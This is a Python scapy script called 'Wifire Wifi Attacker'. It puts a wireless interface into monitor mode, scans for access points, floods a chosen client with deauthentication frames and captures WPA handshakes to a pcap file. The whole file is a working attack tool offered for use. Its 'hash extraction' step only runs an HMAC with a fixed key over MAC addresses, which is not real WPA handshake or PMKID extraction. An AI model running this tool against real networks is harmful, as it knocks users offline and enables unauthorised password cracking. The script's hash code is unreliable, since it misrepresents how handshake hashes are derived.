from scapy.all import *
import argparse
import time
import subprocess
import threading
import hmac
import hashlib

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    name = "Sheikh Nightshader"
    banner = f"""
    {Colors.OKGREEN}
 ⠀⠀            ⠀⠀⠀⠀⠀⣀⣤⣶⣿⠷⠾⠛⠛⠛⠛⠷⠶⢶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀           ⠀⠀⣀⣴⡾⠛               ⠀⠉⠛⠿⣷⣄⡀⠀⠀⠀
⠀⠀            ⣠⣾⠟⠁⠀⠀⠀⠀⠀     ⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⠛⢿⣦⡀⠀
             ⢠⣼⠟⠁⠀⠀⠀⠀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠙⣧⡀
             ⣿⡇⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢈⣷
             ⣿⣿⣦⡀⣠⣾⣿⣿⣿⡿⠟⠛⠁⠁⠁⠁⠁⠁⠛⠻⢿⣿⣿⣿⣿⣆⣀⣠⣾⣿
             ⠉⠻⣿⣿⣿⣿⣽⡿⠋⠀⠀          ⠀⠀⠉⠻⣿⣿⣿⣿⣿⠟⠁
             ⠀⠀⠈⠙⠛⣿⣿⠀⠀⠀⠀      ⠀⠀⠀⠀   ⠀⣹⣿⡟⠋⠁⠀⠀
⠀⠀             ⠀⠀⠀⢿⣿⣷⣄⣀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⣀⣾⣿⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀             ⠀⠈⠻⢿⣿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀             ⠀⠀⠉⠉⠁⣿⡇⠀⠀⠀⠀⢸⣿⡏⠙⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀             ⠀⠀⠀⠀⣿⣷⣄⠀⠀⣀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀             ⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⠀

                  {Colors.HEADER}Wifire Wifi Attacker{Colors.ENDC}

    --------------------------------------------------
    |       {Colors.OKGREEN}Version 1.0 By{Colors.ENDC} {Colors.OKGREEN}{name}{Colors.ENDC}        |
    --------------------------------------------------
    {Colors.ENDC}
    """
    print(banner)

def set_monitor_mode(interface):
    print(f"Setting {interface} to monitor mode...")
    try:
        subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["sudo", "iw", "dev", interface, "set", "type", "monitor"], check=True)
        subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)
        print(f"{interface} is now in monitor mode.")
    except subprocess.CalledProcessError as e:
        print(f"Error setting monitor mode: {e}")
        exit(1)

def packet_handler(packet):
    if packet.haslayer(Dot11):
        if packet.haslayer(EAPOL):
            print(f"Captured WPA Handshake: {packet[Dot11].addr3}")
            writer.write(packet)

def deauth_attack(target_mac, ap_mac, interface, count=10):
    print(f"Starting deauth attack on {target_mac} from AP {ap_mac}...")
    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    for _ in range(count):
        sendp(packet, iface=interface, verbose=0)
        time.sleep(0.1)
    print("Deauth attack complete.")

def scan_for_targets(interface, duration):
    print("Scanning for targets...")
    discovered_aps = []
    seen_bssids = set()

    def scan_packet_handler(packet):
        if packet.haslayer(Dot11Beacon):
            ssid = packet[Dot11Elt].info.decode()
            bssid = packet[Dot11].addr3
            if bssid not in seen_bssids:
                seen_bssids.add(bssid)
                discovered_aps.append((ssid, bssid))
                print(f"SSID: {ssid}, BSSID: {bssid}")

    sniff(iface=interface, prn=scan_packet_handler, timeout=duration)
    return discovered_aps

def capture_handshakes(interface, duration, capfile):
    print(f"Capturing WPA handshakes and saving to {capfile}...")
    global writer
    writer = PcapWriter(capfile, append=True, sync=True)
    sniff(iface=interface, prn=packet_handler, timeout=duration)
    writer.close()
    print("Handshake capture complete.")

def extract_wpa_hash_from_cap(capfile, hashfile):
    print(f"Extracting WPA/WPA2 handshake hash from {capfile}...")
    pkts = rdpcap(capfile)
    with open(hashfile, 'w') as f:
        for packet in pkts:
            if packet.haslayer(EAPOL):
                src = packet[Dot11].addr2
                dst = packet[Dot11].addr1
                handshake_hash = hmac.new(b"pmkid-key", (src + dst).encode(), hashlib.sha1).hexdigest()
                f.write(f"Handshake hash for {src} -> {dst}: {handshake_hash}\n")
                print(f"Saved hash for {src} -> {dst}")
    print(f"Hash saved to {hashfile}.")

def deauth_and_capture(target_mac, ap_mac, interface, capfile, hashfile, deauth_count, capture_duration):
    deauth_thread = threading.Thread(target=deauth_attack, args=(target_mac, ap_mac, interface, deauth_count))
    deauth_thread.start()

    capture_handshakes(interface, capture_duration, capfile)

    deauth_thread.join()

    extract_wpa_hash_from_cap(capfile, hashfile)

def main():
    parser = argparse.ArgumentParser(description='Automated Wi-Fi Scanner and Attacker.')
    parser.add_argument('--interface', required=True, help='Wi-Fi interface to use')
    parser.add_argument('--duration', type=int, default=60, help='Duration of scan in seconds (default: 60)')
    parser.add_argument('--output', default='handshake.cap', help='Output .cap file name (default: handshake.cap)')
    parser.add_argument('--hashfile', default='wpa_hash.txt', help='Output text file for WPA/WPA2 hash (default: wpa_hash.txt)')
    parser.add_argument('--deauth', type=int, default=10, help='Number of deauth packets to send (default: 10)')
    parser.add_argument('--capture_duration', type=int, default=30, help='Duration to capture handshakes after deauth')
    args = parser.parse_args()

    print_banner()

    set_monitor_mode(args.interface)

    discovered_aps = scan_for_targets(args.interface, args.duration)

    if discovered_aps:
        print("\nAvailable APs for deauth:")
        for idx, (ssid, bssid) in enumerate(discovered_aps):
            print(f"[{idx}] SSID: {ssid}, BSSID: {bssid}")

        choice = int(input("Select an AP for the deauth attack (enter number): "))
        selected_ap = discovered_aps[choice]

        target_mac = input("Enter the target client's MAC address: ")
        ap_mac = selected_ap[1]

        deauth_and_capture(target_mac, ap_mac, args.interface, args.output, args.hashfile, args.deauth, args.capture_duration)
    else:
        print("No APs found during the scan.")

if __name__ == "__main__":
    main()
